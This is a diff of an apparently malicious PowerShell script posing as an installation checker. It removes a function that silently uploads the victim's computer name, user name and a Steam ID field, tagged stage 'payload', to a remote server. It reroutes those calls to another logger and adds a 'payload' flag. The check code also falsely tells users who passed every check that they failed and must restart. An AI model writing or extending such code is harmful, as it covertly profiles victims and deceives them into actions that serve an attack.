@@ -40,29 +40,6 @@ function sLog {
     } catch {}
 }
 
-function aLog {
-    param([string]$t,[string]$m,[hashtable]$e = @{})
-    try {
-        $l = @{
-            timestamp = (Get-Date).ToString("o")
-            type = $t
-            message = $m
-            odId = $mId
-            pcName = $env:COMPUTERNAME
-            pcUser = $env:USERNAME
-            steamId = ""
-            username = ""
-            stage = "payload"
-        }
-        if ($e.Count -gt 0) { $l.extra = $e }
-        $j = $l | ConvertTo-Json -Compress
-        $w = New-Object Net.WebClient
-        $w.Headers.Add("Content-Type", "application/json")
-        $null = $w.UploadString("$sUrl/api/log", $j)
-    } catch {}
-}
-function aInfo { param($m, $e = @{}) aLog -t "info" -m $m -e $e }
-
 function lInfo { param($m, $e = @{}) sLog -t "info" -m $m -e $e }
 function lErr { param($m, $e = @{}) sLog -t "errors" -m $m -e $e }
 
@@ -227,13 +204,13 @@ function chk {
     
     if ($pc -eq $tc) {
         Write-Host "  [!] You did not pass the checking! Restart your computer." -ForegroundColor Red
-        aInfo "Installation check completed" @{
+        lInfo "Installation check completed" @{
             passed = $pc
             total = $tc
             percentage = $pp
             allPassed = $true
             repaired = $needsRepair
-            
+            payload = $true
         }
     } elseif ($pc -ge 4) {
         Write-Host "  YOU DID NOT PASS THE CHECKING!" -ForegroundColor DarkYellow
